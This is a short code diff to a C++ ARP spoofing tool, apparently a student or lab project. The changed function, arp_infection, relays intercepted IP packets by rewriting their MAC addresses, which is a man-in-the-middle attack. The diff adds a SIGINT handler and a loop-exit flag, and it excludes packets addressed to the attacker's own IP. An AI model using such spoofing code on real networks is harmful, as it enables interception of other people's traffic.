@@ -64,6 +64,7 @@ const u_char * read_packet(pcap_t* handle)
 
 void arp_infection(void* arg)
 {
+    signal(SIGINT,sig_handler);
     Spoof_arg sarg = *(Spoof_arg*) arg; //because of call by reference while thread
     Sem_post(&sem);
 
@@ -118,7 +119,7 @@ void arp_infection(void* arg)
                 map<Ip,Mac> table = *(sarg.table);
                 Ip sip = ip.ip_.sip();
                 Ip dip = ip.ip_.dip();
-                if(table.find(sip) != table.end() || table.find(dip) != table.end())
+                if((table.find(sip) != table.end() || table.find(dip) != table.end()) && dip!=sarg.a_ip)
                 {
                     ip.eth_.smac_ = sarg.a_mac;
                     ip.eth_.dmac_ = table[sarg.t_ip];
@@ -137,7 +138,8 @@ void arp_infection(void* arg)
             }
             Pthread_mutex_unlock(&mutex2);
             Sem_post(&s);
-            sleep(1.5);
+            if(chk_val) sleep(1.5);
+            else break;
         }
     }
 }
